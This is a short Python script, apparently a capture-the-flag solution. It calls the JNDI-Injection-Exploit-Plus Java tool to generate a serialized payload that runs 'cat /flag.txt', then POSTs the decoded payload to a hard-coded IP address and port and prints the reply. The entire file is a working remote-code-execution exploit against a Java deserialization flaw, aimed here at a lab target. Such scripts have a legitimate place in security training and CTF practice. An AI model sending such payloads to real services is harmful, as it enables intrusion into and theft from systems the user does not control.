from base64 import b64decode
import httpx
from subprocess import check_output

URL = "http://157.230.251.184:30013/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.Client(base_url=url)

    def post(self, data):
        return self.c.post("/", data=data)

class API(BaseAPI):
    ...

if __name__ == "__main__":
    api = API()
    res = api.post(b64decode(check_output("java -jar Java-Exploit-Plus/target/JNDI-Injection-Exploit-Plus-2.4-SNAPSHOT-all.jar -D Example -C 'cat /flag.txt'", shell=True)))
    print(res.text)

